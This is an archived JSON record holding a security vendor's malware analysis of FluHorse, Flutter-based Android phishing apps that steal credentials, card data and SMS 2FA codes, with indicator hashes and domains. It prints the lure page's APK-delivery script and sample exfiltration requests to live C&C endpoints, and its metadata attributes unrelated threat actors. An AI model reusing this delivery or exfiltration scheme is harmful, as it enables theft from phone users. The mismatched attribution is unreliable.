{
    "id": "dd919214-c91e-4fd2-bb4a-01bbd53fe1ce",
    "created_at": "2023-06-05T02:06:06.007813Z",
    "updated_at": "2025-03-27T02:16:26.518388Z",
    "deleted_at": null,
    "sha1_hash": "3e61e64c131b96bedbbd90f99317342059a704ec",
    "title": "2023-05-04 - Eastern Asian Android Assault - FluHorse",
    "authors": "",
    "file_creation_date": "2023-06-04T12:40:15Z",
    "file_modification_date": "2023-06-04T12:40:15Z",
    "file_size": 2380696,
    "plain_text": "# Eastern Asian Android Assault – FluHorse\n\n**[research.checkpoint.com/2023/eastern-asian-android-assault-fluhorse/](https://research.checkpoint.com/2023/eastern-asian-android-assault-fluhorse/)**\n\n_Research by: Alex Shamshur, Sam Handelman, Raman Ladutska, Ohad Mana_\n\n## Introduction\n\n\nMay 4, 2023\n\n\nIn the latest research conducted by Check Point Research, we describe a newly discovered\nmalware called FluHorse. The malware features several malicious Android applications that\n**mimic legitimate applications, most of which have more than 1,000,000 installs. These**\nmalicious apps steal the victims’ credentials and Two-Factor Authentication (2FA) codes.\nFluHorse targets different sectors of Eastern Asian markets and is distributed via emails. In\nsome cases, the emails used in the first stage of the attacks belong to high-profile entities. The\nmalware can remain undetected for months making it a persistent, dangerous, and hard-tospot threat.\n\n\n-----\n\n_Image 1 – One of the malware samples, still not detected on VirusTotal (VT) after 3 months._\n\nCyber-crime operators often get creative in their aim of complicating the malware analysis.\nThey can use tricks like evasion techniques, obfuscation, and long delays before execution –\nall to sneak past virtual environments and confound researchers. Usually, these tricks have\ncustom implementation that require plenty of effort on their creators’ behalf. Only in rare cases\nare malware samples hard to detect and analyze even when they are developed with widely\navailable technologies.\n\nQuite surprisingly, no custom implemented tricks are used inside FluHorse, as the malware\nauthors relied solely on open-source frameworks for the development process. Although\n[some of the applications are created partly with Kotlin, the malicious functionality is](https://kotlinlang.org/)\nimplemented with Flutter – and this is where we focused our technical efforts. [Flutter is an](https://flutter.dev/)\nopen-source UI software development kit created by Google. It is used to develop crossplatform applications for various platforms, including Android and iOS for mobile devices, with a\nsingle codebase. What makes Flutter an appealing choice for malware developers is the use of\na custom virtual machine (VM) to support different platforms and its ease of use for creation\nof GUI elements. In addition, analyzing such applications is complicated, due to the custom\nVM, which makes this framework a perfect solution for Android phishing attacks, as it turned\nout to be.\n\nIn the article below, we describe different targeted markets in several countries and compare\nphishing applications with the legitimate ones – differences are pretty hard to spot at first\nglance). We note the available tools for Flutter-application analysis while also providing the\nenhancements that resulted in our open-source contribution:\n[https://github.com/Guardsquare/flutter-re-demo/pull/4. We go through all the pitfalls](https://github.com/Guardsquare/flutter-re-demo/pull/4)\nencountered during our research and provide solutions on how to bypass them. Finally, we give\nan overview of Command-and-Control (C&C) communication of the malware as well as dive\ndeeply into the details of the network infrastructure analysis.\n\n## Mimicked applications\n\n\n_Image 1 – One of the malware samples, still not detected on VirusTotal (VT) after 3 months._\n\n\n-----\n\nThe malware operators made an eclectic selection of targeted sectors for particular countries,\nusing one mimicked application in each country. One of these mimicked applications is ETC\napplication which is used for toll collection in Taiwan. This application has more than 1,000,000\ninstalls in Google Play. The company behind ETC is trusted and have good reputation, which\nmakes such an application very appealing to the attackers as it is sure to attract solvent\ncustomers:\n\n**Far Eastern Electronic Toll Collection Co., Ltd (FETC) company in Taiwan – The developer**\nof the ETC APK has approximately 16 million transactions per day and more than 6 million\n[users according to the company’s website.](https://www.fetc.net.tw/en/OurBusiness/Achievements.html)\n\nMore cases include a mimicked major transportation application and a major banking\napplication – we do not describe them thoroughly in this article.\n\nAlthough the spheres are different, the malware operators made an effort to carefully mimic all\nthe key interface details to avoid raising any suspicions. We meticulously go through the details\nof GUI in different applications later in the report, in the chapter “Phishing scheme ”.\n\nThere are also some malicious applications that are connected to the Dating sphere, but we did\nnot find any matching applications that the malware attempts to mimic. In this scenario, the\nscheme is a bit different: the malware serves as a browser to the phishing site where the victim\nis supposed to enter the sensitive data. These applications are aimed at Chinese-speaking\nusers.\n\n_Image 2 – An icon of Dating malicious application (translated as “Night Love”)._\n\n## Phishing scheme\n\nLet’s take a look at how the phishing scheme is implemented in different variants of the\napplications. It’s interesting to note that malicious applications do not contain anything except\nfor several replicas of windows to provide a victim with input possibilities. No additional\nfunctions or checks were added. This deliberate simplicity leads us to the conclusion that the\nmalware operators did not put much effort into the programming part of their creation… Or they\ncould have made this decision on purpose to further reduce the chances of being detected by\nsecurity solutions.\n\nWhatever their intention was, the scheme works pretty well. After the victim enters sensitive\ndata, it is exfiltrated to the C&C server. Meanwhile, the malware asks the victim to wait for\nseveral minutes while “the data is being processed.” At this step, the SMS interception feature\ntakes the stage and redirects all the incoming SMS traffic to the malicious server. If the\n\n\n-----\n\nmalware actors enter stolen credentials or credit card data and then are asked to input Two\nFactor Authentication (2FA) code, this is intercepted as well. The diagram below summarizes\nthe phishing scheme in a graphical form:\n\n_Image 3 – How the malware performs phishing attacks._\n\nPlease note that depending on the type of malicious application (targeting Electronic Toll,\nBanking or Dating users), credentials or credit card numbers may not be required.\n\n## Infection chain and targets\n\nBefore the malicious applications are installed on the victims’ devices, they must first be\ndelivered. This is where email lures come in handy. We traced infection chains for different\ntypes of malicious applications and discovered multiple high-profile entities among the recipient\nof these emails, including employees of the government sector and large industrial companies.\n\nEmail lures are a good use of social engineering and are aligned with the alleged purpose of\nsubsequently installed malicious APK: paying tolls.\n\n[This is an example of an email lure with the [email protected] sender address:](https://research.checkpoint.com/cdn-cgi/l/email-protection#b3d5d6c7d09dddd6c79dc7c49edddcc7dad0d6f3c7c4d5d6c7d09dd0dcde)\n\n\n_Image 3 – How the malware performs phishing attacks._\n\n\n-----\n\n_Image 4 – Example of an email sent by malware operators to government recipient._\n\nThis is the email translation:\n```\nDear eTag user\n\nYour one-time toll of 128 yuan expires on January 10, 2023. To avoid\n\na fine of 300 yuan per transaction, please use your mobile phone to click\n\nand download the Yuantong Electric Collection App as soon as possible\n\nPay online. https://www.fetc-net[.]com\n\nFar Eastern Electronic Toll Collection Co,Ltd.All Right Reserved.\n\nYuantong Electric has trademarks and copyrights, please do not copy or\n\nreprint without authorization.\n\nIf you have any questions, please call Yuantong Customer Service Line 02-77161998.\n\nThanks.\n\n\n```\nThe malicious fetc-net[.]com domain used by the malware operators is very similar to\nfetc.net.tw, which is the official site of FETC company.\n\n\n_Image 4 – Example of an email sent by malware operators to government recipient._\n\n\n-----\n\nOn this malicious website, the malware actors added an additional protection layer to ensure\nthat only the victims are able to download the APK: it is downloaded in the case if a target’s\nuser agent matches the expected one. This check is performed via a client-side JavaScript:\n```\nvar user = navigator.userAgent;\n\nif (user.match(/(iphone os)/i)) {\n\n     console.log(\"isphone\");}\n\nelse if (user.match(/ipad/i)) {\n\n     console.log(\"isipad\");}\n\nelse if (user.match(/(midp|ucweb|android|windows ce|windows mobile)/i)) {\n\n     window.location.href = \"fetc.apk\";\n\n};\n\n```\nAfter the malware is installed, it requires SMS permissions:\n\n_Image 5 – ETC APK makes a request for SMS permissions._\n\nThe permissions obtained at this step will come into play just after the victim enters the\nsensitive data. And this brings us straight to the next chapter where the attack scheme is\ndescribed.\n\n## Malicious applications: step-by-step GUI analysis\n\nLet’s take a more detailed look at a couple of malicious applications we encountered.\n\n## Malicious Electronic Toll Collection APK\n\nThis application contains only 3 windows:\n\n\n_Image 5 – ETC APK makes a request for SMS permissions._\n\n\n-----\n\n_Image 6 – Windows shown in sequence by the malicious ETC APK._\n\nThe first window asks for user credentials, and the second one for the credit card data. All this\nsensitive data is exfiltrated to the malicious C&C server. Next, the third window asks the user to\nwait for 10 minutes because the “system is busy.” The hope is that the user will close the\napplication, or at least not suspect anything wrong for a reasonable period of time. While the\nuser is lulled into a false sense of security by the “system busy” message, the malware\noperators perform all their required actions, i.e., intercept all the incoming SMS with 2FA codes\nand make use of the stolen data.\n\nThe entire GUI of this decoy application looks like a pretty neat copy of the original ETC\napplication for collecting tolls. This is the visual comparison of the malicious and legitimate\napplication entry windows:\n\n\n_Image 6 – Windows shown in sequence by the malicious ETC APK._\n\n\n-----\n\n_Image 7 – Original entry window (left) and the malicious APK entry window (right)._\n\nThe original application does not show any fields to log in or enter user credentials. Instead,\nthere is a separate window for this purpose:\n\n\n_Image 7 – Original entry window (left) and the malicious APK entry window (right)._\n\n\n-----\n\n_Image 8 – Original application log in form._\n\n## Malicious Dating APK\n\nThe Dating application does not contain any windows. Instead, it effectively functions as a\nbrowser leading to the phishing dating site. However, the principle of stealing and processing\nthe data remains the same.\n\nWe do not have screenshots of all the steps interacting with the victim, as at the time of writing\nthis article the malicious servers responsible for processing stolen data from this APK were not\nactive. According to the code, only credit card data is stolen, and no credentials are asked for.\n\nThis is how the entry to the dating site looks inside the application:\n\n\n_Image 8 – Original application log in form._\n\n\n-----\n\n_Image 9 – Window of the phishing dating site shown inside the APK._\n\nThe translation of the shown message follows:\n\n_Image 10 – The translation of the message shown on the phishing site._\n\n## Technical details\n\nThe analysis of Flutter-based applications, compared to the analysis of pure Android\napplications, requires some intermediate steps to reach our goal.\n\nThere are already several good existing guidelines that we used as a basis for our technical\nanalysis:\n\n\n_Image 10 – The translation of the message shown on the phishing site._\n\n\n-----\n\n[Reverse Engineering Flutter apps by tst.sh](https://blog.tst.sh/reverse-engineering-flutter-apps-part-1/)\n[The Current State & Future of Reversing Flutter Apps by Guardsquare](https://www.guardsquare.com/blog/current-state-and-future-of-reversing-flutter-apps)\n\nWe introduced some technical and quality-of-life improvements to the open-source tools used\nin those publications.\n\n## Digging deep\n\nAs we mentioned in the introduction, Flutter uses a custom virtual environment to support multiplatform development with a single code base. A specific programming language, called Dart,\nis used for the development. Analyzing the Flutter platform code gets a bit easier as it is\n[available as an open-source project, but can still be a tedious process.](https://github.com/flutter/flutter)\n\n_Image 11 – Dart presentation in the Flutter Github page._\n\nLet’s take a look at some of the complications we encountered when dealing with an ad-hoc\nrealm of Flutter runtime. We dissected an APK with the hash\n2811f0426f23a7a3b6a8d8bb7e1bcd79e495026f4dcdc1c2fd218097c98de684.\n\nFlutter runtime for ARM uses its own stack pointer register (R15) instead of the built-in stack\npointer (SP). Which register is used as a stack pointer makes no difference in code execution\nor in the reverse-engineering process. However, it makes a big difference for the decompiler.\nBecause of a non-standard register usage, a wrong and ugly pseudocode is generated.\n\nA good way to start the malware analysis is to determine the protocol of the communication\nwith the C&C servers. This can say a lot about the malicious functionality. There is one string\ninside that corresponds to the site we saw in the phishing email:\n\n\n_Image 11 – Dart presentation in the Flutter Github page._\n\n\n-----\n\n_Image 12 – Address of the C&C server among the strings inside the malicious APK._\n\nHowever, when we try to find some references to this string, the analysis fails:\n\n_Image 13 – Absence of references to the C&C server string in IDA._\n\nOur goal is to create a reference to this string to locate the code where the C&C\n**communication is performed.**\n\nThe articles we mentioned earlier introduce some nice open-source tools to deal with Flutter\n[applications: flutter-re-demo and](https://github.com/Guardsquare/flutter-re-demo) [reFlutter. Their main idea is to use runtime snapshots to](https://github.com/ptswarm/reFlutter)\ncreate Dart objects and find references to them. The main purpose of reFlutter is to gather the\nfunctions’ names while flutter-re-demo allows us to work with the memory dumps collected\nduring the application execution.\n\nHowever, in addition to memory snapshots, some more runtime information is required. Flutter\nruntime uses a heap to create objects and stores the pointer to created objects in a special\narea called the Object Pool. The pointer to this pool is passed to the method in a register X27.\nWe need to find the location of the Object Pool.\n\n_flutter-re-demo uses_ [Frida to collect memory dumps and to get the Object Pool address. If we](https://frida.re/)\n[run our APK with the dump_flutter_memory.js script available in the flutter-re-demo repository,](https://github.com/Guardsquare/flutter-re-demo/blob/main/hooking/dump_flutter_memory.js)\nwe see the desired address:\n\n\n_Image 12 – Address of the C&C server among the strings inside the malicious APK._\n\n\n-----\n\n_Image 14 – Frida script output with the required addresses._\n\nNow we have all the required elements to start a productive reverse engineering.\n\n[After loading the dumps with map_dart_vm_memory.py and running the script](https://github.com/Guardsquare/flutter-re-demo/blob/main/map_dart_vm_memory.py)\n[create_dart_objects.py, we can now see at least some of the objects:](https://github.com/Guardsquare/flutter-re-demo/blob/main/create_dart_objects.py)\n\n_Image 15 – Objects created by the script._\n\n\n_Image 15 – Objects created by the script._\n\n\n-----\n\nWe have to mention here our first addition to the original flutter-re-demo scripts as a part of the\nopen-source contribution.\n\nThere is a script called create_dart_objects.py which intends to create Dart objects. The script\nworks by walking over Object Pool, parsing records and creating objects. There are a bunch of\nobjects that the script has no information about – for them the script creates the following\nstructures which describe object format:\n```\nstruct DartUnkObjNNN {\n\n     uint8_t is_canonical_and_gc;\n\n     uint8_t size_tag;\n\n     uint16_t cid;\n\n     uint32_t padding;\n\n     uint64_t unk;\n\n}\n\n\n```\nNNN here is replaced by the “class id” number, like this:\n\n_Image 16 – Struct, created by create_dart_objects.py._\n\nDuring the Flutter application reverse-engineering, we noticed that the last field (unk) is\nfrequently used as a pointer. We considered converting this field from a simple QWORD to\nOFFSET QWORD. This could give us some false positives but could also be very helpful in\ncreating references. We therefore decided to change the field type for unkin structures created\nby the script. This is our change to the original script:\n\n\n-----\n\n_Image 17 – Our changes to the dart_obj_create.py script._\n\nThe repository we mentioned contains a script for creating references to Dart objects:\nadd_xref_to_dart_objects.py. When you run it, the script goes through the code and creates\nreferences to the Dart objects created by create_dart_objects.py scripts. After this process, we\nstill have only one reference to the string we are interested in, namely the reference from\nObject Pool:\n\n_Image 18 – There are no references to the C&C server URL._\n\nOur first thought was maybe there are no cross-references at all? But no, there are several\ncross-references present, e.g., this object has references:\n\n\n_Image 18 – There are no references to the C&C server URL._\n\n\n-----\n\n_Image 19 – A couple of references from functions to objects._\n\nThis is the object which is referenced from the function:\n\n_Image 20 – How the reference looks in the function code._\n\nLet’s investigate why we do not see our reference. Walking through the code of\nadd_xref_to_dart_objects.py brings us to the file dart_obj_xref.py. This file also walks through\nthe code, tries to extract references to data based on the register X27, counts offsets of these\nreferences, and finally creates IDA references. Analysis of the code shows that the original\nscript supports two variants of ARM code that access the object:\n\n1:\n```\nADD       X17, X27, #0x18,LSL#12\n\nLDR       X17, [X17,#0xA58]\n\n\n```\n2:\n```\nLDR       X24, [X27,#0x20]\n\n```\n\n_Image 19 – A couple of references from functions to objects._\n\n\n-----\n\nDoes the code use some other instructions to reference the register X27? Let s check. For\nconvenience, let’s modify the script and add a comment to each instruction processed with\nX27:\n\nImage 21 – dart_obj_xref.py modification.\n\nWe can then inspect a disassembler listing for constructions processed with X27, which have\nno comment reference to Dart object attached. We can partially automate these actions by\ngenerating a listing file with IDA and greping it with grep utility like this:\n```\ngrep \"X27\" libapp.lst | grep --invert-match \"reference to Dart object\"\n\n```\nFirst, grep finds all strings with X27. Then all those strings fall to the second grep command to\nprint only those strings which contain no reference to Dart object. Therefore, we see only\nunsupported X27 references.\n\nWhen we detect an unsupported X27 construction, we add the code to support it in the script.\nAfter several iterations, we finally get our references to the C&C address string:\n\n_Image 22 – References to the C&C address string._\n\nLet’s inspect these functions starting with sub_70FD611C0C. A brief overview shows that this\nfunction intends to do something with the HTTP POST method with the path “/addcontent3”\nwhen communicating with the C&C server:\n\n\n_Image 22 – References to the C&C address string._\n\n\n-----\n\n_Image 23 – Pseudo-code of the sub_70FD611C0C function._\n\nThere is also a reference to this function from another Dart object:\n\n_Image 24 – Reference to a Dart object._\n\nAs we go through the references, we finally come to the function with the following code:\n\n_Image 25 – Code responsible for listening to all the incoming SMS._\n\nThis function installs a listener for all incoming SMS messages.\n\nTo be absolutely sure we made a correct static analysis, we checked this function on a real\ndevice in runtime. Indeed, we caught a POST request to the C&C server.\n\nThis is an example of C&C request after the device received an SMS with the text “Fdsa”:\n```\nPOST  /addcontent3\n\nuser-agent: Dart/2.16 (dart:io)\n\ncontent-type: application/x-www-form-urlencoded; charset=utf-8\n\naccept-encoding: gzip\n\ncontent-length: 12\n\nBody: ids=&c4=Fdsa\n\n```\n\n_Image 23 – Pseudo-code of the sub_70FD611C0C function._\n\n\n_Image 24 – Reference to a Dart object._\n\n\n-----\n\nTherefore, the function sub_70FD611C0C is used for leaking SMS messages to the C&C\nserver.\n\nThe functions sub_70FD61EBC4 and sub_70FD61EECC look very similar to the already\nanalyzed sub_70FD611C0C except for the kind of exfiltrated data and the server path. These\nfunctions use the paths “/addcontent” and “/addcontent2”, respectively, and are used to\nexfiltrate the victim’s credentials and pay card information.\n\nThere are no traces of server communication in DEX code, so we can assume all\ncommunication is located in the Flutter part of the application. After analyzing all the functions\nrelated to the C&C server communication, we can describe the network protocol.\n\n## C&C communication\n\nC&C protocol intends to only send data from the compromised device to the server. There are\nno commands to send in the opposite direction i.e. from the server to the compromised device.\nHTTPS is used to transfer data, and there are several endpoints used.\n\nThis is the description of every endpoint we encountered in the analyzed samples:\n\n\n**Endpoint** **Description** **Method**\n**Used**\n\n\n**Fields**\n\n\n/addcontent Used to exfiltrate the victims’ credentials. POST с1 – user login\n\nс2 – user\npassword\n\n\n/addcontent2 Used to exfiltrate credit card data to the\nserver.\n\n/addcontent3 Used to exfiltrate SMS messages intercepted\nby the malicious application.\n\n\nPOST ids – always\nempty\n\nc3 – for card\nnumber\n\nc33 – for\nexpiration date\n\nc333 – for CVC\ncode\n\nPOST ids – always\nempty\n\nc4 – for SMS\nmessage body\n\n\nWeb variants of decoys that are used for Dating malicious applications use a very similar\nprotocol. This is an example of exfiltrating credit card data:\n```\nURL: https://jp.yelove.xyz/addcontent2\n\nMETHOD: POST\n\nBODY: {\"cardNumber\":\"1234253456345\",\"name\":\"sfsdfgfde dg\nsdg\",\"expiryDate\":\"11/27\",\"cvvCode\":\"150\"}\n\n```\n\n-----\n\nThe only difference is the body format: the Web version uses JSON instead of the\n“name=value” format.\n\n## Contribution summary\n\nThis is a summary of our open-source contribution to the flutter-re-demo project:\n\n1. Added parsing of some previously unsupported constructions for accessing Dart objects.\n2. Added saving key information during dynamic analysis and using this information in IDA\n\nscripts.\n3. One field for the unknown Dart object struct is set to the offset so that it can bring more\n\nreferences to Dart objects.\n\n## Conclusion\n\nIdealists invent new technologies hoping for the progress of humankind. Realists adapt these\ninventions to day-to-day needs. Evil minds abuse them in often unforeseen and unpredictable\nways to make the most for themselves.\n\nThis timeless truth got an unexpected implementation in abusing modern development\nframeworks by Android malicious developers. Such frameworks can be used as a doubleedged sword as we described above. Malware operators pursued a direct approach to stealing\nvictims’ sensitive data without distractions to other components.\n\nThe technical implementation of these malicious samples consists of several layers. As the\nfunctional part is relatively simple, we can conclude that the malware developers did not put\nmuch effort into the programming, instead relying on Flutter as a developing platform. The\ndevelopers’ main focus is on the GUI. This approach allowed them to create dangerous and\nmostly undetected malicious applications. One of the benefits of using Flutter is that its hard-toanalyze nature renders many contemporary security solutions worthless.\n\nWe traced FluHorse activity back to May 2022. Our analysis shows that these campaigns\nremain an ongoing threat as new infrastructure nodes and malicious applications appear each\nmonth.\n\nAs the human factor remains an important factor in malware attacks, Check Point Research\nrecommends the following suggestions for mobile device users:\n\nCheck Point’s [Harmony Mobile prevents malware from infiltrating mobile devices by detecting](https://www.checkpoint.com/harmony/mobile-security/mobile/)\nand blocking the download of malicious apps in real-time. Harmony Mobile’s unique network\nsecurity infrastructure – On-device Network Protection – allows you to stay ahead of emerging\n[threats by extending Check Point’s industry-leading network security technologies to mobile](https://www.checkpoint.com/quantum/maestro-hyperscale-network-security/)\ndevices.\n\n## Relevant Check Point protections:\n\n\n-----\n\nStealer.Android.FluHorse.TC.*\nFluHorse.TC.*\n\n## Updates and edits\n\n2023-05-11 – Edited to remove sensitive research data\n\n## IOCs\n\n**Samples**\n\n**Hash** **Description**\n\n0a577ee60ca676e49add6f266a1ee8ba5434290fa8954cc35f87546046008388 Dating app\n\n2e18c919ad53a66622e404a96cbde15f237a7bfafed1c0896b6b7e289bc230d6 Major\nbanking app\n\n416e22d6b85d6633d1da000058efb3cd597b8b7df5d77a6c3456464d65a775b3 Toll app\n\n74008170fc5de4d40bcc97b8e2c6fbdb01889805c6ca456fd08134881cad0d2c Dating app\n\n8b591b5488dab8adb485ea55197148d6b39715da562537c7d8b1a79cd3639510 Major\nbanking app\n\n910707dd041c13f3379115bdf93bb4984ac20b9ecafd59f93e5089ab3a141e67 Toll app\n\n9220752302e2bca0002ea701c772b2f2306831711b1c323157ef2573f176821a Major\nbanking app\n\nd78fa2c475ea08f90ef6b189d2a3fddc9ead86ae43df272e9083f92f7a47aabe Major\nbanking app\n\nd8a777b050ba27eeb41c0035f3477882d7eafc56edfcbe1e8cef05a7e85c8b9e Delivery\n\nde86b0fbbd343f3fc5bb6c19a067a6f063b423132e19c6004c7b696ea1fe0c7d Major\nbanking app\n\n2811f0426f23a7a3b6a8d8bb7e1bcd79e495026f4dcdc1c2fd218097c98de684 Toll app\n\n659f69d660179d0e8a5f4c2850c51a05529e0ef06ac739ca6f61fe470917ee96 Toll app\n\ne54a2581545477882a1b7c1f9cbb74fb2aa97fcf1ee8b097c8085302ed6fbf36 Major\ntransportation\napp\n\n**Domains**\n\n**Domain** **Decoy relation**\n\n\n-----\n\n**Domain** **Decoy relation**\n\ninfo1.yelove.xyz Dating\n\njp.yelove.xyz Dating\n\nh5.yelove.xyz Dating\n\napi.vpbankem.com Bank\n\napi.fetctw.xyz Toll\n\napi.fetc-net.com Toll\n\napi.usadmin-3.top Toll and major transportation app\n\nwww.pcdstl.com Toll\n\nh5.spusp.xyz Dating\n\n## Online resources\n\n Open-source projects\n\n Technical analysis articles\n\n Contribution\n\n[https://github.com/Guardsquare/flutter-re-demo/pull/4 // Our contribution to flutter-re-demo](https://github.com/Guardsquare/flutter-re-demo/pull/4)\n\nGO UP\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-05-04 - Eastern Asian Android Assault - FluHorse.pdf"
    ],
    "report_names": [
        "2023-05-04 - Eastern Asian Android Assault - FluHorse.pdf"
    ],
    "threat_actors": [
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1685930766,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1685882415,
    "ts_modification_date": 1685882415,
    "files": {
        "pdf": "https://archive.orkl.eu/3e61e64c131b96bedbbd90f99317342059a704ec.pdf",
        "text": "https://archive.orkl.eu/3e61e64c131b96bedbbd90f99317342059a704ec.txt",
        "img": "https://archive.orkl.eu/3e61e64c131b96bedbbd90f99317342059a704ec.jpg"
    }
}